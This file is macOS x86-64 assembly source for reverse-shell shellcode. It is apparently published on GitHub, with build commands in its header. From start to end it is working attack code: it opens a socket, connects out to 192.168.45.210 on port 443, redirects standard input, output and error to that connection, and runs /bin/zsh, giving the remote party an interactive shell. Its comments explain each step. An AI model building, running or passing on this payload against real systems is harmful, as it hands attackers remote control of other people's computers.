; Title: rvsh.asm
; Author: ApexPredator
; License: MIT
; Github: https://github.com/ApexPredator-InfoSec/MacOS/rvsh.asm
; Description: x86_x64 Reverse Shell Shellcode for MacOS, tested on BigSur
; Assemble: nasm -f macho64 rvsh.asm
; Link: ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem rvsh.o -o rvsh

bits 64
global _main
_main:

 ; int socket(int domain, int type, int protocol); 
push	0x2
pop	    rdi		                    ;RDI = AF_INET = 2
push	0x1
pop	    rsi		                    ; RSI = SOCK_STREAM = 1
xor	    rdx, rdx	                ; RDX = IPPROTO_IP = 0

; store syscall number on RAX
push	0x61		                ; put 97 on the stack (socket syscall#)
pop	    rax		                    ; pop 97 to RAX
bts	    rax, 0x19		            ; set the 25th bit to 1
syscall			                    ; trigger syscall
mov	    r9, rax		                ; save socket number

; sockaddr sin_len, sin_family, sin_port, sin_addr, sin_zero
mov     rsi, 0xd22da8c0bb010210     ;sin_addr= 0xc0a82dd2 (192.168.45.210) sin_port = 1bb (443) sin_len = 0x10
push    rsi                         ; push sockaddr struct to stack
push    rsp                         ; get sockaddr struct address
pop     rsi                         ; pop sockaddr struct in to rsi 

; int connect(int s, caddr_t name, socklen_t namelen)
mov     rdi, r9                     ; put socket handle in rdi
push    0x10
pop     rdx                         ; set namelen = 0x10
push    0x62                        ; push 98 on the stack
pop     rax                         ; pop 98 to RAX (connect syscall#)
bts     rax, 0x19                   ; set the 25th bit to 1
syscall

; int dup2(u_int from, u_int to)
mov     rdi, r9                    ; put the socket file descriptor into RDI
push    2
pop     rsi                         ; set RSI = 2
dup2_loop:                          ; beginning of our loop
push    0x5a                        ; put 90 on the stack (dup2 syscall#)
pop     rax                         ; pop it to RAX
bts     rax, 0x19                   ; set the 25th bit to 1
syscall                             ; trigger syscall
dec     rsi                         ; decrement RSI
jns     dup2_loop                   ; jump back to the beginning of the loop if RSI>=0

; int execve(char *fname, char **argp, char **envp)
xor     rdx, rdx                    ; zero our RDX
push    rdx                         ; push NULL string terminator
mov     rbx, '/bin/zsh'             ; move our string into RBX
push    rbx                         ; push the string we stored in RBX to the stack
mov     rdi, rsp                    ; store the stack pointer in RDI
push    rdx                         ; argv[1] = 0
push    rdi                         ; argv[0] = /bin/zsh 
mov     rsi, rsp                    ; argv    = rsp - store RSP's value in RSI
push    0x3b                        ; put 59 on the stack
pop     rax                         ; pop it to RAX
bts     rax, 0x19                   ; set the 25th bit to 1
syscall
